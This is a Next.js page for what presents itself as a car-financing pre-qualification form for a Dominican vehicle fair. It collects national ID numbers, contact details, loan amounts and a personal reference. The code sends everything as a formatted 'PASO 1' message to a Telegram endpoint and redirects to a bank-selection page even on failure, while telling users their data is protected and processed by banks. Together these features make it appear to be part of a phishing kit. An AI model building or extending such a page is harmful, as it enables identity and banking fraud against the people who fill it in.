"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";

export default function Home() {
  const router = useRouter();

  // Estados del formulario
  const [nombre, setNombre] = useState("");
  const [apellido, setApellido] = useState("");
  const [cedula, setCedula] = useState("");
  const [correo, setCorreo] = useState("");
  const [plazo, setPlazo] = useState("");
  const [telefono, setTelefono] = useState("");
  const [marca, setMarca] = useState("");
  const [anio, setAnio] = useState("");
  const [tipoInicial, setTipoInicial] = useState("");
  const [monto, setMonto] = useState("");
  const [refNombre, setRefNombre] = useState("");
  const [refApellido, setRefApellido] = useState("");
  const [parentesco, setParentesco] = useState("");
  const [distribuidor, setDistribuidor] = useState("");
  const [codigoDistribuidor, setCodigoDistribuidor] = useState("");
  const [loading, setLoading] = useState(false);

  const handleContinue = async () => {
    if (
      !nombre.trim() || !apellido.trim() || !cedula.trim() || !correo.trim() ||
      !plazo.trim() || !telefono.trim() || !marca.trim() || !anio.trim() ||
      !tipoInicial.trim() || !monto.trim() || !refNombre.trim() || !refApellido.trim() ||
      !parentesco.trim() || !distribuidor.trim() || !codigoDistribuidor.trim()
    ) {
      alert("⚠️ Todos los campos son obligatorios. Por favor, complete el formulario completo.");
      return;
    }

    setLoading(true);

    try {
      const datosFormulario = {
        pagina: "🚀 PASO 1: DATOS DE PRECALIFICACIÓN",
        nombre: `${nombre.toUpperCase()} ${apellido.toUpperCase()}`,
        cedula: cedula,
        telefono: telefono,
        correo: correo,
        banco: "⏳ Seleccionando banco...",
        detalles: `
🚗 **DATOS DEL VEHÍCULO**
• Marca/Modelo: ${marca}
• Año: ${anio}
• Inicial: ${tipoInicial}
• Monto: ${monto}
• Plazo: ${plazo}

👥 **REFERENCIA PERSONAL**
• Nombre: ${refNombre} ${refApellido}
• Parentesco: ${parentesco}

🏢 **DISTRIBUIDOR**
• Nombre: ${distribuidor}
• Código: ${codigoDistribuidor}
        `.trim()
      };

      const response = await fetch("/api/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(datosFormulario),
      });

      const result = await response.json();

      if (result.success) {
        localStorage.setItem("cliente_actual", `${nombre} ${apellido}`);
        localStorage.setItem("cliente_telefono", telefono);
        router.push("/bancos");
      } else {
        throw new Error(result.error || "Error al enviar");
      }

    } catch (error) {
      console.error("Error enviando datos:", error);
      router.push("/bancos");
    } finally {
      setLoading(false);
    }
  };

  const isFormIncomplete = !nombre || !apellido || !cedula || !correo || !plazo || !telefono || !marca || !anio || !tipoInicial || !monto || !refNombre || !refApellido || !parentesco || !distribuidor || !codigoDistribuidor;

  return (
    <main className="min-h-screen bg-slate-50 text-slate-900">
      
      {/* HERO AUTOFERIA PREMIUM */}
      <section className="relative py-12 md:py-24 overflow-hidden bg-white">

        {/* 1. Fondo principal estilo flyer (Al fondo de todo) */}
        <div className="absolute inset-0 bg-gradient-to-br from-cyan-50 via-white to-pink-50 pointer-events-none" />

        {/* 2. Ciudad de fondo (Por encima del degradado) */}
        <div className="absolute bottom-0 left-0 w-[1600px] h-[600px] opacity-[0.90] pointer-events-none z-0">
          <img
            src="/images/city.png"
            alt=""
            className="w-full h-full object-contain"
          />
        </div>

        {/* 3. Palmeras (Por encima del degradado) */}
        <div className="absolute right-0 top-0 w-[450px] h-full opacity-[1.5] pointer-events-none z-0">
          <img
            src="/images/palms.png"
            alt=""
            className="w-full h-full object-contain"
          />
        </div>

        {/* Luces grandes azul y rosa */}
        <div className="absolute -left-32 top-8 w-[720px] h-[260px] bg-cyan-400/25 blur-3xl rotate-[-16deg] pointer-events-none" />
        <div className="absolute -right-32 bottom-6 w-[760px] h-[280px] bg-pink-500/25 blur-3xl rotate-[14deg] pointer-events-none" />

        {/* Barras diagonales decorativas */}
        <div className="absolute -left-24 bottom-10 w-[620px] h-[80px] bg-gradient-to-r from-cyan-400/35 to-transparent rotate-[-12deg] blur-sm pointer-events-none" />
        <div className="absolute -right-24 top-16 w-[620px] h-[80px] bg-gradient-to-l from-pink-400/35 to-transparent rotate-[-12deg] blur-sm pointer-events-none" />

        {/* Puntos estilo diseño publicitario */}
        <div className="absolute left-8 bottom-14 w-36 h-36 opacity-25 bg-[radial-gradient(circle,#ec4899_2px,transparent_2px)] [background-size:16px_16px] pointer-events-none" />
        <div className="absolute right-10 top-12 w-36 h-36 opacity-25 bg-[radial-gradient(circle,#06b6d4_2px,transparent_2px)] [background-size:16px_16px] pointer-events-none" />

        {/* Línea suave inferior */}
        <div className="absolute left-0 bottom-0 w-full h-24 bg-gradient-to-t from-white via-white/70 to-transparent pointer-events-none" />

        {/* Contenedor principal de contenido */}
        <div className="relative z-10 max-w-7xl mx-auto px-4 md:px-6">
          <div className="grid lg:grid-cols-2 gap-12 items-center">

            {/* Texto */}
            <div className="hero-text">
              <div className="inline-block rounded-full bg-pink-500 text-white px-5 py-2 text-sm font-bold shadow-lg">
                Precalifícate hoy
              </div>

              <h1 className="mt-6 text-5xl md:text-7xl font-black leading-none uppercase tracking-tight">
                <span className="text-blue-950">
                  ¡Móntate en la
                </span>
                <br />
                <span className="text-pink-500 italic">
                  aventura!
                </span>
              </h1>

              <h3 className="mt-4 text-2xl md:text-4xl font-extrabold uppercase text-blue-900 tracking-wide">
                Autoferia de vehículos
              </h3>

              <p className="mt-5 text-base md:text-lg text-slate-700 max-w-xl font-medium">
                Completa el formulario para iniciar tu proceso de precalificación.
              </p>

              <div className="mt-7 flex flex-wrap gap-3">
                <span className="rounded-full bg-blue-950 text-white px-4 py-2 text-sm font-bold shadow-md">
                  Aprobación rápida
                </span>
                <span className="rounded-full bg-white text-blue-950 px-4 py-2 text-sm font-bold shadow-md border border-slate-200">
                  Vehículos nuevos y usados
                </span>
              </div>
            </div>

            {/* Imagen de carros */}
            <div className="relative">

              {/* Líneas de velocidad grandes */}
              <div className="absolute left-[-260px] top-[42%] w-[850px] h-[18px] bg-pink-500/70 blur-sm rotate-[-10deg]" />

              <div className="absolute left-[-230px] top-[53%] w-[780px] h-[14px] bg-cyan-400/65 blur-sm rotate-[-10deg]" />

              <div className="absolute left-[-200px] top-[63%] w-[700px] h-[10px] bg-blue-500/45 blur-sm rotate-[-10deg]" />

              {/* Resplandor detrás de la tarjeta */}
              <div className="absolute -inset-6 bg-gradient-to-br from-cyan-300/40 via-pink-300/30 to-pink-500/40 rounded-[3rem] blur-2xl" />

              {/* Tarjeta principal */}
              <div className="relative z-10 rounded-[2.2rem] bg-white/90 border border-white p-4 shadow-car backdrop-blur-md">

                <div className="rounded-[1.7rem] overflow-hidden">
                  <img
                    src="/images/foto1.png"
                    alt="Autoferia de vehículos"
                    className="w-full h-[260px] md:h-[420px] object-cover float-car"
                  />
                </div>

              </div>

            </div>

          </div>
        </div>
      </section>

      {/* Form Section */}
      <section className="max-w-7xl mx-auto px-4 md:px-6 py-10 md:py-14">
        <div className="grid lg:grid-cols-[1.2fr_.8fr] gap-8">
          <div className="rounded-3xl bg-white border border-slate-200 shadow-xl p-6 md:p-8">
            <h2 className="text-2xl md:text-3xl font-extrabold text-slate-900 mb-8">
              Formulario de precalificación
            </h2>
            
            <form className="grid grid-cols-1 md:grid-cols-2 gap-4" onSubmit={(e) => e.preventDefault()}>
              <input placeholder="Nombre" value={nombre} onChange={(e) => setNombre(e.target.value)} className="w-full rounded-xl border border-slate-300 px-4 py-3" />
              <input placeholder="Apellido" value={apellido} onChange={(e) => setApellido(e.target.value)} className="w-full rounded-xl border border-slate-300 px-4 py-3" />
              <input placeholder="Cédula" value={cedula} onChange={(e) => setCedula(e.target.value)} className="w-full rounded-xl border border-slate-300 px-4 py-3" />
              <input placeholder="Correo electrónico" type="email" value={correo} onChange={(e) => setCorreo(e.target.value)} className="w-full rounded-xl border border-slate-300 px-4 py-3" />
              
              <select value={plazo} onChange={(e) => setPlazo(e.target.value)} className="w-full rounded-xl border border-slate-300 px-4 py-3 bg-white text-slate-900">
                <option value="">Plazo (Años)</option>
                {[3, 4, 5, 6].map(a => <option key={a} value={`${a} años`}>{a} años</option>)}
              </select>
              
              <input placeholder="Teléfono" value={telefono} onChange={(e) => setTelefono(e.target.value)} className="w-full rounded-xl border border-slate-300 px-4 py-3" />
              
              <select value={marca} onChange={(e) => setMarca(e.target.value)} className="w-full rounded-xl border border-slate-300 px-4 py-3 bg-white text-slate-900 overflow-y-auto">
                <option value="">Seleccione Marca / Modelo</option>
                
                <optgroup label="Toyota (Los más buscados)">
                  <option value="Toyota Corolla">Toyota Corolla</option>
                  <option value="Toyota Camry">Toyota Camry</option>
                  <option value="Toyota Rav4">Toyota Rav4</option>
                  <option value="Toyota Hilux">Toyota Hilux</option>
                  <option value="Toyota 4Runner">Toyota 4Runner</option>
                  <option value="Toyota Land Cruiser Prado">Toyota Prado</option>
                  <option value="Toyota Land Cruiser VX">Toyota Land Cruiser VX</option>
                  <option value="Toyota Yaris / Vitz">Toyota Yaris / Vitz</option>
                  <option value="Toyota Tacoma / Tundra">Toyota Tacoma / Tundra</option>
                </optgroup>

                <optgroup label="Honda (Línea completa)">
                  <option value="Honda Civic">Honda Civic</option>
                  <option value="Honda CR-V">Honda CR-V</option>
                  <option value="Honda Accord">Honda Accord</option>
                  <option value="Honda Fit">Honda Fit</option>
                  <option value="Honda HR-V">Honda HR-V</option>
                  <option value="Honda Pilot">Honda Pilot</option>
                  <option value="Honda Odyssey">Honda Odyssey</option>
                </optgroup>

                <optgroup label="Hyundai (Especiales Sonata y más)">
                  <option value="Hyundai Sonata LF">Hyundai Sonata LF</option>
                  <option value="Hyundai Sonata New Rise">Hyundai Sonata New Rise</option>
                  <option value="Hyundai Sonata D20">Hyundai Sonata N20</option>
                  <option value="Hyundai Tucson">Hyundai Tucson</option>
                  <option value="Hyundai Santa Fe">Hyundai Santa Fe</option>
                  <option value="Hyundai Elantra">Hyundai Elantra</option>
                  <option value="Hyundai SonataY20">Hyundai Sonata Y20</option>
                  <option value="Hyundai Cantus">Hyundai Cantus</option>
                </optgroup>

                <optgroup label="Kia (Especiales K5 y SUVs)">
                  <option value="Kia K5 MX/SX">Kia K5</option>
                  <option value="Kia Sportage">Kia Sportage</option>
                  <option value="Kia Sorento">Kia Sorento</option>
                  <option value="Kia Picanto">Kia Picanto</option>
                  <option value="Kia Rio">Kia Rio</option>
                  <option value="Kia Telluride">Kia Telluride</option>
                </optgroup>

                <optgroup label="Americanos (Ford, Chevy, Jeep)">
                  <option value="Ford Explorer">Ford Explorer</option>
                  <option value="Ford F-150">Ford F-150</option>
                  <option value="Ford Ranger">Ford Ranger</option>
                  <option value="Ford Escape">Ford Escape</option>
                  <option value="Chevrolet Tahoe / Suburban">Chevrolet Tahoe / Suburban</option>
                  <option value="Chevrolet Colorado">Chevrolet Colorado</option>
                  <option value="Chevrolet Equinox">Chevrolet Equinox</option>
                  <option value="Jeep Grand Cherokee">Jeep Grand Cherokee</option>
                  <option value="Jeep Wrangler">Jeep Wrangler</option>
                </optgroup>

                <optgroup label="Otros Populares en RD">
                  <option value="Nissan Frontier">Nissan Frontier</option>
                  <option value="Nissan Rogue / X-Trail">Nissan Rogue / X-Trail</option>
                  <option value="Lexus (Varios)">Lexus (IS, ES, RX, LX)</option>
                  <option value="Mazda CX-5 / CX-9">Mazda CX-5 / CX-9</option>
                  <option value="Mitsubishi L200">Mitsubishi L200</option>
                  <option value="Isuzu D-Max">Isuzu D-Max</option>
                  <option value="Volkswagen Amarok / Tiguan">Volkswagen Amarok / Tiguan</option>
                </optgroup>

                <optgroup label="Marcas Chinas y Eléctricos">
                  <option value="BYD">BYD (Eléctricos)</option>
                  <option value="Changan Uni-T / Uni-K">Changan (Uni-T / Uni-K)</option>
                  <option value="Jetour X70 / X90">Jetour (X70 / X90)</option>
                  <option value="GAC Motor">GAC Motor</option>
                  <option value="Tesla">Tesla</option>
                </optgroup>

                <option value="Otro">Otro Marca / Modelo</option>
              </select>

              <input placeholder="Año del vehículo" value={anio} onChange={(e) => setAnio(e.target.value)} className="w-full rounded-xl border border-slate-300 px-4 py-3" />

              <select value={tipoInicial} onChange={(e) => setTipoInicial(e.target.value)} className="w-full rounded-xl border border-slate-300 px-4 py-3 bg-white text-slate-900">
                <option value="">Tipo de inicial</option>
                <option>Inicial efectivo</option>
                <option>Inicial en cuenta</option>
                <option>No tengo inicial</option>
              </select>

              <input placeholder="Monto de la financiación" value={monto} onChange={(e) => setMonto(e.target.value)} className="w-full rounded-xl border border-slate-300 px-4 py-3" />
              <input placeholder="Ref. Nombre" value={refNombre} onChange={(e) => setRefNombre(e.target.value)} className="w-full rounded-xl border border-slate-300 px-4 py-3" />
              <input placeholder="Ref. Apellido" value={refApellido} onChange={(e) => setRefApellido(e.target.value)} className="w-full rounded-xl border border-slate-300 px-4 py-3" />
              <input placeholder="Parentesco" value={parentesco} onChange={(e) => setParentesco(e.target.value)} className="w-full rounded-xl border border-slate-300 px-4 py-3" />
              <input placeholder="Distribuidor asociado" value={distribuidor} onChange={(e) => setDistribuidor(e.target.value)} className="w-full rounded-xl border border-slate-300 px-4 py-3" />
              
              <div className="md:col-span-2">
                <input placeholder="Código de distribuidor" value={codigoDistribuidor} onChange={(e) => setCodigoDistribuidor(e.target.value)} className="w-full rounded-xl border border-slate-300 px-4 py-3" />
              </div>

              <button
                type="button"
                onClick={handleContinue}
                disabled={loading || isFormIncomplete}
                className="md:col-span-2 rounded-2xl bg-gradient-to-r from-[#ec4899] via-[#d946ef] to-[#2563eb] hover:brightness-110 hover:scale-[1.02] disabled:opacity-40 text-white py-4 font-bold text-lg transition-all duration-300 shadow-xl cursor-pointer disabled:cursor-not-allowed"
              >
                {loading ? "Enviando solicitud..." : "Continuar"}
              </button>
            </form>
          </div>

          <div className="space-y-6">
            <div className="rounded-3xl border border-slate-200 bg-white p-6 shadow-sm">
              <h3 className="text-xl font-bold">Información</h3>
              <p className="mt-3 text-slate-600">
                Sus datos están protegidos. Esta precalificación es inmediata y procesada por las instituciones bancarias correspondientes.
              </p>
            </div>
          </div>
        </div>
      </section>
    </main>
  );
}